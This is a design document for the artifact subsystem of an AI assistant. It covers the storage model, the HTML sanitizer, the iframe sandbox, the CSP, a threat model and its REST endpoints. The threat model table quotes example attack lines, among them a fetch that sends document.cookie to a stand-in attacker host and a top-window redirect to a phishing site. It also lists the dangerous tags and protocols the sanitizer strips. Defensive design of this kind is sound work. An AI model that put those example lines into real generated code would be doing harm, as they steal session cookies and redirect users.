# Artifact Architecture, Viewer & HTML Security Model

## 1. Overview & Purpose

The **Artifact Subsystem** enables The Lenny Growth Assistant to generate, persist, sanitize, and render rich standalone outputs—including:
- **Markdown Artifacts:** Ship 30 for 30 atomic essays, product strategy memos, teardowns, and frameworks.
- **HTML/CSS/JS Artifacts:** Interactive widgets, Product-Market Fit calculators, retention cohort visualizers, and pricing matrices.

Because generated HTML/JS must be treated as **untrusted user/model content**, the system implements a strict **defense-in-depth security model** combining server-side AST sanitization, client-side isolated iframe sandboxing, and strict Content Security Policies (CSP).

---

## 2. Artifact Data Model

```text
Artifact
├── id: UUID (Primary Key)
├── session_id: UUID (Foreign Key -> sessions.id, ON DELETE CASCADE)
├── message_id: Optional[UUID] (Foreign Key -> messages.id, ON DELETE SET NULL)
├── title: String(255)
├── artifact_type: String ("markdown" | "html" | "svg")
├── content: Text (Sanitized Markdown / HTML / SVG content)
├── version: Integer (Default: 1)
├── metadata: JSONB (e.g. {"skill": "ship30", "word_count": 1248, "sources": [...]})
├── created_at: DateTime (UTC)
└── updated_at: DateTime (UTC)
```

Session isolation is strictly enforced: every artifact belongs to a single `session_id`, ensuring zero cross-session visibility.

---

## 3. Defense-in-Depth HTML Security Architecture

```
+-----------------------------------------------------------------------------------------+
|                                SECURITY LAYER 1: BACKEND                                |
| • Server-Side AST & Regex Sanitizer (BeautifulSoup + Regex)                             |
| • Strips dangerous tags: <applet>, <embed>, <object>, <frame>, <frameset>, <base>       |
| • Strips inline event handlers: onerror, onload, onclick, onmouseover, onfocus, etc.   |
| • Neutralizes dangerous protocols: javascript:, vbscript:, data:text/html               |
| • Neutralizes breakout variables: window.parent, window.top, document.cookie,           |
|   localStorage, sessionStorage, indexedDB                                               |
| • Enforces target="_blank" and rel="noopener noreferrer" on all links                   |
| • Injects strict CSP: default-src 'none'; style-src 'unsafe-inline';                    |
|   script-src 'unsafe-inline'; img-src data: https:; font-src data: https:;             |
+-----------------------------------------------------------------------------------------+
                                             │
                                             ▼
+-----------------------------------------------------------------------------------------+
|                                SECURITY LAYER 2: CLIENT                                 |
| • Dedicated React ArtifactViewer Component                                              |
| • Markdown rendered via safe structured component parsing (no direct innerHTML)        |
| • Code / Preview Toggle allowing raw inspection of generated source                     |
+-----------------------------------------------------------------------------------------+
                                             │
                                             ▼
+-----------------------------------------------------------------------------------------+
|                            SECURITY LAYER 3: BROWSER SANDBOX                            |
| <iframe sandbox="allow-scripts" srcdoc="...">                                           |
| • NO allow-same-origin: Browser treats iframe as opaque null origin; cannot access host |
|   cookies, localStorage, indexedDB, or session tokens.                                  |
| • NO allow-top-navigation: Iframe cannot redirect or reload the host application.       |
| • NO allow-popups: Cannot open unmonitored browser tabs/windows.                        |
| • NO allow-forms: Cannot submit external POST forms.                                    |
+-----------------------------------------------------------------------------------------+
```

---

## 4. Threat Model & Mitigations

| Threat | Attack Vector | Mitigation Strategy | Residual Risk |
| :--- | :--- | :--- | :--- |
| **Threat 1: Host DOM Breakout** | Generated JS calls `window.parent.document.body.innerHTML = "pwned"` | 1. Sanitizer neutralizes `window.parent` and `window.top`.<br>2. Iframe lacks `allow-same-origin`, triggering a Cross-Origin Security Error if attempted in browser. | None (Blocked at DOM level by browser sandbox). |
| **Threat 2: Cookie / Token Theft** | Generated JS calls `fetch('attacker.com?c=' + document.cookie)` | 1. Sanitizer neutralizes `document.cookie`, `localStorage`, `sessionStorage`.<br>2. Iframe origin is `null`, isolating storage from host domain. | None. |
| **Threat 3: Malicious Navigation / Phishing** | Generated JS navigates `window.top.location = 'phishing.com'` | 1. Sanitizer strips `top.location` and `parent.location`.<br>2. Iframe lacks `allow-top-navigation`. | None. |
| **Threat 4: Dangerous Protocols** | Links or iframes use `javascript:alert(1)` or `data:text/html` | Sanitizer rewrites dangerous protocol schemes to `#neutralized-unsafe-link`. | None. |
| **Threat 5: Data Exfiltration via External Networks** | Generated code makes arbitrary fetch/XHR calls to attacker servers | CSP injected into artifact head restricts network connections (`default-src 'none'`). | Low (Restricted to allowed inline styling/script execution). |

---

## 5. API Contracts

### A. Create Artifact in Session: `POST /api/v1/sessions/{session_id}/artifacts`
```json
{
  "title": "Interactive PMF Calculator",
  "artifact_type": "html",
  "content": "<!DOCTYPE html><html><head><style>body{font-family:sans-serif;}</style></head><body><h1>PMF Calculator</h1></body></html>",
  "version": 1,
  "metadata": {"skill": "artifact_builder", "topic": "pmf"}
}
```

### B. List Session Artifacts: `GET /api/v1/sessions/{session_id}/artifacts`
```json
[
  {
    "id": "7c9e6679-7425-40de-944b-e07fc1f90ae7",
    "session_id": "3fa85f64-5717-4562-b3fc-2c963f66afa6",
    "title": "Interactive PMF Calculator",
    "artifact_type": "html",
    "content": "<meta http-equiv=\"Content-Security-Policy\" ...>...",
    "version": 1,
    "created_at": "2026-09-09T14:20:00Z",
    "updated_at": "2026-09-09T14:20:00Z",
    "metadata": {"skill": "artifact_builder"}
  }
]
```

### C. Get Single Artifact: `GET /api/v1/artifacts/{artifact_id}`
Returns `200 OK` with `ArtifactResponse` or `404 Not Found`.

### D. Delete Artifact: `DELETE /api/v1/artifacts/{artifact_id}`
Returns `204 No Content` or `404 Not Found`.

---

## 6. Ship 30 for 30 to Artifact Workflow

When a Ship 30 essay is synthesized, `ArtifactService.create_from_ship30` converts the result into a persisted Markdown artifact:
```python
artifact = await ArtifactService.create_from_ship30(
    db=db,
    session_id=session_id,
    ship30_res=ship30_result,
)
```
This stores the headline, complete ~1,250-word Markdown content, word count, and grounding transcript citations into the session catalog for split-pane rendering in the Artifact Studio.

